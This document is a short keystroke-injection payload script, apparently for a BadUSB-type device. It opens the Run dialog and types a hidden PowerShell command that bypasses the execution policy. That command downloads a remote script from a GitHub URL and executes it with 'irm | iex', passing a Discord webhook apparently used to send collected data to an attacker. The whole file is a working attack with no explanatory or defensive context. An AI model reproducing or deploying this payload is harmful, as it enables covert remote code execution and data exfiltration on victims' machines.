
// Replace DISCORD_WEBHOOK_HERE before running!

// script setup
layout("us")

// Open Powershell as Admin
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/MouseAC-to-DC.ps1 | iex");
delay(500);
press("ENTER");
